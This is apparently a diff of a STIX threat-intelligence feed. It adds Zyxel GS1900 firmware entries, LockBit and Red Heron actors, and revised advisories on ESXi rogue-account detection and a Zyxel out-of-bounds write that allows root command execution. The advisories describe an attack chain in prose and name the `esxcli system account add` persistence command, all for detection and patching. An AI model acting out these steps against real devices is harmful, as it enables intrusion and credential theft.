+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
     },
     {
       "type": "relationship",
@@ -6738,6 +7214,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--8b621efd-809b-55a3-a8db-c766dad2faac",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T03:50:17.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "attributed-to",
+      "source_ref": "report--af2dcc55-1faa-56fe-a969-08104814eacf",
+      "target_ref": "threat-actor--04070bc1-a2d3-5185-b616-3ffd33adc3c4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--8ba61918-92d2-56a5-ba9d-8f4014ec1240",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-01T02:45:30.000Z",
@@ -6767,6 +7254,17 @@
       "relationship_type": "uses",
       "source_ref": "report--2a5f423c-4425-5da5-b22b-7a172f6b7dbf",
       "target_ref": "attack-pattern--03c83a54-7fcd-5e1a-99d5-88d0bbd8fb19"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--8c1e522e-56ef-5ddd-b6d9-495f14aec99e",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--c24d25f1-e637-5b28-9478-699de25db42b",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
     },
     {
       "type": "relationship",
@@ -6877,6 +7375,17 @@
       "relationship_type": "has",
       "source_ref": "software--58a0e8a4-cc62-5468-8239-98fa40162b3e",
       "target_ref": "vulnerability--c442e0e5-4ea9-581b-b4c3-c3f45dabb4ae"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--8f862466-f052-54e9-9b9a-378fdd076a9d",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "attack-pattern--4c3e7380-a536-599a-8a1e-e402b95df8d6"
     },
     {
       "type": "relationship",
@@ -7013,6 +7522,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--95143d98-6407-50ad-a986-1f760bc3da72",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--bc0ea609-f3de-5c78-b767-bb709b8ba1cf"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--953f55b3-b377-529f-8d8c-daff38bf7d89",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -7097,6 +7617,17 @@
       "relationship_type": "uses",
       "source_ref": "report--e44595fc-ee32-5d28-a72d-502c8e2e31b6",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--96c57a5d-af9b-5761-96e2-fcef0de5dc41",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--fa28c809-c186-50b5-9a67-bd3b8f537126"
     },
     {
       "type": "relationship",
@@ -7394,6 +7925,17 @@
       "relationship_type": "has",
       "source_ref": "software--b8d3657d-c257-5bf0-bad6-72ba8180bd89",
       "target_ref": "vulnerability--91f4ed47-56a3-54ca-84e2-dd7c5c77c36d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--9f0ff8c5-1a63-5a04-a8e3-b095f2dc26a9",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--edda04b5-e755-58e3-aca7-a496409a409f",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -8303,7 +8845,7 @@
       "id": "relationship--b3ea973a-f9a3-583b-893b-e9122c964c98",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-03T15:31:26.000Z",
-      "modified": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
       "relationship_type": "uses",
       "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
       "target_ref": "attack-pattern--ed297fb1-fb56-59cb-bbe0-dabc9e9cea06"
@@ -8410,6 +8952,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--b5edfffb-827b-5743-a9d3-6ec0fbf8de32",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--64057762-0adc-5b9b-be32-73953b9c9897",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--b76a2cbe-e1e6-50e3-8e8f-be5f86d459a3",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -8417,6 +8970,17 @@
       "relationship_type": "has",
       "source_ref": "software--433631a3-5e22-555d-8855-4b566d52f081",
       "target_ref": "vulnerability--49418355-e05a-50ab-9c78-6ab5d31009e4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--b784e234-975f-59f5-8646-e3669ef238a0",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--72e6a636-6535-560c-a591-3651e83afbbb",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -9796,6 +10360,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--d9e0e1ff-4694-55d7-8c6f-4a6279c2e58d",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--5abc469c-7535-55ad-8879-1562b03b77c2"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--dae0a2f4-5598-5c04-80ee-8e85067f130b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -9858,6 +10433,17 @@
       "relationship_type": "uses",
       "source_ref": "report--08d2ae2f-a14d-5c22-9aa0-ad1f9372a800",
       "target_ref": "indicator--2eb154ae-1ccb-5e68-aa60-a485cd250f30"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--dcb4167a-2d4c-5256-ad81-a54ffff69fdc",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--56658c1c-d1d3-53b5-9db1-156dc5a5a424",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
     },
     {
       "type": "relationship",
@@ -9957,6 +10543,17 @@
       "relationship_type": "has",
       "source_ref": "software--3b563201-1fc8-5b68-beea-991e491fe3b0",
       "target_ref": "vulnerability--c3cbffd2-ac70-5d81-87d1-92c18d72e5e6"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--df6ffbcc-a126-575f-a825-f973f6fdc8cf",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--e97a3e4e-61c2-5fae-a0b0-45410b4b0ee3",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -10144,6 +10741,17 @@
       "relationship_type": "uses",
       "source_ref": "report--e80b02f2-1439-5779-9312-3e121ead0507",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--e4fb9766-7ff5-5d52-aa5c-c7dfefc33325",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--c8ad540c-140c-5a44-91b9-e3607f16c592",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
     },
     {
       "type": "relationship",
@@ -10665,6 +11273,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--eefe52db-9473-5fb9-b386-3243d0bd2b02",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--7cc614ab-516c-51d7-9ffa-f32fe405a8ac",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--ef130753-6e78-5dde-86e3-083b324574b3",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-02T15:09:08.000Z",
@@ -10914,6 +11533,17 @@
       "relationship_type": "uses",
       "source_ref": "report--61e6b2d8-884c-53c5-9e92-cf0fe79f0a0e",
       "target_ref": "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--f61fbe85-af1a-52c4-9645-bd2feb08df92",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T03:50:17.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--af2dcc55-1faa-56fe-a969-08104814eacf",
+      "target_ref": "attack-pattern--e6e63efe-42b5-57bd-b4b7-a8415ab979eb"
     },
     {
       "type": "relationship",
@@ -23854,19 +24484,37 @@
       "id": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-03T15:31:26.000Z",
-      "modified": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
       "name": "VMware ESXi: Unauthorized local account creation detection",
       "description": "## Overview\nLocal account creation on VMware ESXi hosts serves as a persistence mechanism that survives session termination. Unauthorized accounts, often created via the Host Client or `esxcli` system commands, are a known precursor to hypervisor-level control, particularly in ransomware campaigns. Organizations should audit account creation events against expected administrative activity.\n\n## Impact\nUnauthorized local accounts provide persistent access to the ESXi hypervisor, enabling potential lateral movement, data exfiltration, or deployment of ransomware by threat actors who have gained initial management access.\n\n## Recommendation\n- Deploy log collection for VMware ESXi using the Elastic vSphere integration to ensure visibility into `hostd` and shell execution logs.\n- Establish a baseline of authorized administrative accounts for all ESXi hosts.\n- Monitor for the creation of local accounts (`esxcli system account add`) or logs indicating an account was created on a host.\n- Investigate any account creation not tied to documented onboarding or break-glass procedures by identifying the user who performed the action and checking for subsequent assignment of administrative roles.\n",
       "published": "2026-11-03T15:31:26.000Z",
       "labels": [
+        "esxi",
+        "extortion",
+        "lockbit",
         "persistence",
         "ransomware",
         "vmware"
       ],
       "object_refs": [
+        "attack-pattern--4c3e7380-a536-599a-8a1e-e402b95df8d6",
         "attack-pattern--ed297fb1-fb56-59cb-bbe0-dabc9e9cea06",
         "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--a4e435a2-21e4-5a0c-87a3-22bdb661eaa1"
+        "indicator--06f16ce4-0383-50f3-8303-e6bdcebced47",
+        "indicator--071242c2-4399-5ba8-8f7c-19ee188bdf4f",
+        "indicator--37741032-7175-5ca3-83ca-78c8b9b83291",
+        "indicator--42962976-b688-56b1-9823-595379e2be8f",
+        "indicator--5abc469c-7535-55ad-8879-1562b03b77c2",
+        "indicator--69658970-8f9b-575d-9fa9-ef241bc4a655",
+        "indicator--7309e6d0-9483-55c8-8535-8bf4cead2a5d",
+        "indicator--a40d7216-6a2a-5ecc-862c-8eaa2106ce06",
+        "indicator--b153733e-48cd-5ec5-8df3-46f6e11df27d",
+        "indicator--b9aea232-bd4f-5d84-a5c3-14d474318c96",
+        "indicator--bc0ea609-f3de-5c78-b767-bb709b8ba1cf",
+        "indicator--e3f47d4c-cd29-5658-826f-201ce56ae33d",
+        "indicator--fa28c809-c186-50b5-9a67-bd3b8f537126",
+        "software--a4e435a2-21e4-5a0c-87a3-22bdb661eaa1",
+        "threat-actor--b23fad01-b25a-5627-9487-9f6e4e961825"
       ],
       "external_references": [
         {
@@ -23889,16 +24537,20 @@
         {
           "source_name": "reference",
           "url": "https://lolesxi-project.github.io/LOLESXi/#"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://www.ransomware.live/group/lockbit5"
         }
       ],
-      "confidence": 60,
+      "confidence": 80,
       "x_craftedsignal_brief_id": "brief-2026-11-03-esxi-account-persistence",
       "x_craftedsignal_event_id": "brief-2026-11-03-esxi-account-persistence",
-      "x_craftedsignal_revision": 1,
+      "x_craftedsignal_revision": 2,
       "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-esxi-account-persistence/",
-      "x_craftedsignal_activity_at": "2026-11-03T15:31:26.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
+      "x_craftedsignal_activity_at": "2026-11-05T08:54:12.000Z",
+      "x_craftedsignal_severity": "high",
+      "x_craftedsignal_type": "threat",
       "x_craftedsignal_exploitation_evidence": {
         "status": "unknown"
       },
@@ -24159,18 +24811,38 @@
       "id": "report--af2dcc55-1faa-56fe-a969-08104814eacf",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-03T03:50:17.000Z",
-      "modified": "2026-11-03T21:28:45.000Z",
-      "name": "Zyxel GS1900-24E: Out-of-bounds write vulnerability (CVE-2026-107441)",
-      "description": "An out-of-bounds write vulnerability exists in the CGI program of Zyxel GS1900-24E firmware versions through 2.90(AAHK.2)C0. This flaw may allow an unauthenticated adjacent attacker to potentially execute OS commands via a crafted HTTP request. The vulnerability is identified as CVE-2026-107441 with a CVSS v3.1 base score of 8.8.\n",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "Zyxel GS1900 Series: Unauthenticated Remote Command Execution (CVE-2026-107441)",
+      "description": "## Overview\n\nResearch by Binarly has identified that Zyxel GS1900 network switches remain vulnerable to unauthenticated remote command execution despite the application of previous security patches (Patch 2). The vulnerability, tracked as CVE-2026-107441, stems from an out-of-bounds write in the switch's web management interface. \n\nThe flaw exists because input validation logic in the Patch 2 firmware occurs only after the memory corruption has already triggered, allowing an attacker to overwrite internal control variables and redirect execution flow to attacker-supplied commands. Zyxel has released Patch 3 firmware to remediate this issue.\n\n## Attack Chain\n\n1. Attacker identifies internet-exposed GS1900 switch management interface.\n2. Attacker sends a crafted HTTP request with an oversized 140th parameter to the web management service.\n3. The service performs an out-of-bounds write, overwriting the parameter counter and subsequent memory.\n4. The attacker achieves arbitrary code execution with root privileges.\n5. The attacker downloads and executes a data-collection script.\n6. The script harvests configuration data and hashed root credentials from the device.\n7. Data is staged for exfiltration via the web interface.\n\n## Impact\n\nSuccessful exploitation allows unauthenticated attackers to gain root-level access to the switch. Observed impact includes the exfiltration of device configurations and hashed root credentials. Attackers have been observed targeting these devices to perform mass data collection, with a high proportion of affected devices identified as still running factory-default credentials.\n\n## Recommendation\n\n1. Immediately apply the 2.90 Patch 3 firmware update to all Zyxel GS1900 models listed in the advisory.\n2. Inventory all internet-exposed network management interfaces and restrict access to these services to trusted management subnets via firewall rules.\n3. Audit all GS1900 switches for evidence of unauthorized persistent scripts or modified configuration files.\n4. Rotate all credentials on any GS1900 switches that were reachable via the internet prior to patching, particularly those where default credentials remained in use.\n",
       "published": "2026-11-03T03:50:17.000Z",
+      "labels": [
+        "network-security",
+        "rce",
+        "root-access",
+        "vulnerability"
+      ],
       "object_refs": [
+        "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d",
+        "attack-pattern--bea84da1-fe85-5fa2-a60d-90c3c86b9473",
+        "attack-pattern--e6e63efe-42b5-57bd-b4b7-a8415ab979eb",
         "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
         "software--1605c069-ae86-5564-b6bb-3f877f6d94a1",
+        "software--56658c1c-d1d3-53b5-9db1-156dc5a5a424",
+        "software--64057762-0adc-5b9b-be32-73953b9c9897",
         "software--696ec3c9-54ac-53e6-a56c-f03c0867c6dc",
+        "software--72e6a636-6535-560c-a591-3651e83afbbb",
+        "software--7cc614ab-516c-51d7-9ffa-f32fe405a8ac",
         "software--7da506b2-1340-5111-90b1-2e0ff1bd2426",
         "software--9e651ddf-2ce5-504b-ac22-8284e70f949e",
         "software--b9917b2e-c447-543f-9a73-8380190ced8a",
         "software--bc6070ca-d642-551c-ba71-6e46e656df7e",
+        "software--c24d25f1-e637-5b28-9478-699de25db42b",
+        "software--c8ad540c-140c-5a44-91b9-e3607f16c592",
+        "software--e97a3e4e-61c2-5fae-a0b0-45410b4b0ee3",
+        "software--edda04b5-e755-58e3-aca7-a496409a409f",
+        "software--f7d30204-5702-51c7-a160-c6923ea50a84",
+        "software--ffbab69e-70ac-5e4a-8011-02774d500969",
+        "threat-actor--04070bc1-a2d3-5185-b616-3ffd33adc3c4",
         "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4",
         "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
       ],
@@ -24202,6 +24874,10 @@
         },
         {
           "source_name": "reference",
+          "url": "https://thehackernews.com/2026/11/zyxel-gs1900-patch-fails-to-block-zero.html"
+        },
+        {
+          "source_name": "reference",
           "url": "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-buffer-overflow-vulnerability-in-certain-aps-fwa7-and-security-routers-11-03-2026"
         },
         {
@@ -24209,14 +24885,14 @@
           "url": "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-out-of-bounds-write-vulnerability-in-gs1900-series-switches-11-03-2026"
         }
       ],
-      "confidence": 80,
+      "confidence": 95,
       "x_craftedsignal_brief_id": "brief-2026-11-03-zyxel-gs1900-24e-oob-write",
       "x_craftedsignal_event_id": "brief-2026-11-03-zyxel-gs1900-24e-oob-write",
-      "x_craftedsignal_revision": 3,
+      "x_craftedsignal_revision": 4,
       "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-zyxel-gs1900-24e-oob-write/",
-      "x_craftedsignal_activity_at": "2026-11-03T21:28:45.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
+      "x_craftedsignal_activity_at": "2026-11-05T08:54:12.000Z",
+      "x_craftedsignal_severity": "critical",
+      "x_craftedsignal_type": "threat",
       "x_craftedsignal_exploitation_evidence": {
         "status": "not_observed"
       },
@@ -29785,6 +30461,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--56658c1c-d1d3-53b5-9db1-156dc5a5a424",
+      "name": "GS1900-8 (2.90(AAHH.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--56e3a747-5d0e-552a-a483-ed29234cc77e",
       "name": "Digital signage devices",
       "vendor": "Videostrong Technology"
@@ -29978,6 +30661,13 @@
       "id": "software--63b660fe-2751-565a-a00f-808cbc4162ac",
       "name": "Attendo Admin Android application (\u003c= 3.0.13)",
       "vendor": "Attendo"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
+      "id": "software--64057762-0adc-5b9b-be32-73953b9c9897",
+      "name": "GS1900-10HP (2.90(AAZI.2)C0 and earlier)",
+      "vendor": "Zyxel"
     },
     {
       "type": "software",
@@ -30179,6 +30869,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--72e6a636-6535-560c-a591-3651e83afbbb",
+      "name": "GS1900-24E (2.90(AAHK.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--731a6ee1-c43e-5438-a774-15b01f699e69",
       "name": "Yeti (\u003c 2.5.1)"
     },
@@ -30264,6 +30961,13 @@
       "id": "software--7ca6e693-185f-5ed3-87d6-ef4e6f6d20ac",
       "name": "C Driver",
       "vendor": "MongoDB"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
+      "id": "software--7cc614ab-516c-51d7-9ffa-f32fe405a8ac",
+      "name": "GS1900-16 (2.90(AAHJ.2)C0 and earlier)",
+      "vendor": "Zyxel"
     },
     {
       "type": "software",
@@ -31138,6 +31842,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--c24d25f1-e637-5b28-9478-699de25db42b",
+      "name": "GS1900-24 (2.90(AAHL.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--c2a4ea37-d62a-5296-8030-14086cf3d2e9",
       "name": "Electron (\u003c 44.9.1 / \u003c 43.8.1 / \u003c 42.11.16)"
     },
@@ -31215,6 +31926,13 @@
       "id": "software--c88cb775-5188-51d8-86f2-60360af09fda",
       "name": "ZHOME A0101 (1.0.1.0 Build 202004151405)",
       "vendor": "Ziroom"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
+      "id": "software--c8ad540c-140c-5a44-91b9-e3607f16c592",
+      "name": "GS1900-24EP (2.90(ABTO.2)C0 and earlier)",
+      "vendor": "Zyxel"
     },
     {
       "type": "software",
@@ -31596,6 +32314,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--e97a3e4e-61c2-5fae-a0b0-45410b4b0ee3",
+      "name": "GS1900-8HP (2.90(AAHI.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--e9ffedb1-cc6e-5064-9bba-1e8ef9e2d0c6",
       "name": "Apache HTTP Server (2.4.35-2.4.62)",
       "vendor": "Apache"
@@ -31625,6 +32350,13 @@
       "id": "software--ec433ddf-a970-53d6-a634-a0ea0d5201d5",
       "name": "Threat Response (\u003c 4.17.333)",
       "vendor": "Tanium"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
+      "id": "software--edda04b5-e755-58e3-aca7-a496409a409f",
+      "name": "GS1900-48HPv2 (2.90(ABTQ.2)C0 and earlier)",
+      "vendor": "Zyxel"
     },
     {
       "type": "software",
@@ -31724,6 +32456,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--f7d30204-5702-51c7-a160-c6923ea50a84",
+      "name": "GS1900-24HPv2 (2.90(ABTP.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--f807003b-597f-5c73-a2d9-23699995ae87",
       "name": "6valley (16.0)",
       "vendor": "6amTech"
@@ -31763,8 +32502,24 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--ffbab69e-70ac-5e4a-8011-02774d500969",
+      "name": "GS1900-48 (2.90(AAHN.2)C0 and earlier)",
+      "vendor": "Zyxel"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--ffbb0796-87e5-5b41-bff9-43b38ee2c883",
       "name": "Logstash"
+    },
+    {
+      "type": "threat-actor",
+      "spec_version": "2.1",
+      "id": "threat-actor--04070bc1-a2d3-5185-b616-3ffd33adc3c4",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "Red Heron"
     },
     {
       "type": "threat-actor",
@@ -31837,6 +32592,15 @@
       "created": "2025-01-01T00:00:00.000Z",
       "modified": "2025-01-01T00:00:00.000Z",
       "name": "TraderTraitor"
+    },
+    {
+      "type": "threat-actor",
+      "spec_version": "2.1",
+      "id": "threat-actor--b23fad01-b25a-5627-9487-9f6e4e961825",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "LockBit"
     },
     {
       "type": "threat-actor",
